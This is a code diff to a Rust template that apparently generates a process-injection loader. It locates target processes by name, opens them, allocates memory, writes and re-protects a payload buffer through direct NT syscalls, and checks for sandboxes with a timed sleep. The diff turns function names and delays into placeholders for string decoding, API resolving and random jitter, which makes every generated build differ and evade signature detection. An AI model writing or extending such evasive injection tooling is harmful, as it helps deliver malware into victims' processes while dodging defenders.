@@ -29,7 +29,11 @@ use std::time::Instant;
 
 {{DECRYPTION_FUNCTION}}
 
-fn boxboxbox(tar: &str) -> Vec<usize> {
+{{STR_DECODER}}
+
+{{API_RESOLVER}}
+
+fn {{FN_FIND_PID}}(tar: &str) -> Vec<usize> {
     let mut dom: Vec<usize> = Vec::new();
     let s = System::new_all();
     let tar_lower = tar.to_lowercase();
@@ -41,14 +45,14 @@ fn boxboxbox(tar: &str) -> Vec<usize> {
     dom
 }
 
-fn pause(ms: i64) {
+fn {{FN_PAUSE}}(ms: i64) {
     let interval: i64 = -(ms * 10_000);
     let _ = syscall!("NtDelayExecution", 0u32, &interval as *const i64);
 }
 
 fn check_environment() -> bool {
     let start = Instant::now();
-    pause(3000);
+    {{FN_PAUSE}}(3000);
     start.elapsed().as_millis() >= 2500
 }
 
@@ -59,7 +63,7 @@ fn wipe(buf: &mut Vec<u8>) {
     buf.clear();
 }
 
-fn enhance(mut buf: Vec<u8>, tar: usize) {
+fn {{FN_INJECT}}(mut buf: Vec<u8>, tar: usize) {
     let mut process_handle = tar as HANDLE;
     let mut oa = OBJECT_ATTRIBUTES::default();
     let mut ci = CLIENT_ID {
@@ -76,7 +80,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         ).unwrap_or(-1);
         if !NT_SUCCESS(s) { return; }
 
-        pause(150);
+        {{FN_PAUSE}}({{JITTER_1}});
         {{NT_DELAY_STEP}}
 
         let mut base: *mut c_void = null_mut();
@@ -91,7 +95,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         ).unwrap_or(-1);
         if !NT_SUCCESS(s) { return; }
 
-        pause(200);
+        {{FN_PAUSE}}({{JITTER_2}});
         {{NT_DELAY_STEP}}
 
         let buf_len = buf.len();
@@ -106,7 +110,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         if !NT_SUCCESS(s) { return; }
 
         wipe(&mut buf);
-        pause(150);
+        {{FN_PAUSE}}({{JITTER_3}});
         {{NT_DELAY_STEP}}
 
         let mut old_perms = PAGE_READWRITE;
@@ -120,7 +124,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         ).unwrap_or(-1);
         if !NT_SUCCESS(s) { return; }
 
-        pause(100);
+        {{FN_PAUSE}}({{JITTER_4}});
         {{NT_DELAY_STEP}}
         {{NT_DELAY_FINAL}}
 
@@ -154,10 +158,10 @@ fn main() {
 
     {{MAIN}}
 
-    let list: Vec<usize> = boxboxbox(tar);
+    let list: Vec<usize> = {{FN_FIND_PID}}(tar);
     if !list.is_empty() {
         for i in &list {
-            enhance(vec.clone(), *i);
+            {{FN_INJECT}}(vec.clone(), *i);
         }
     }
 }
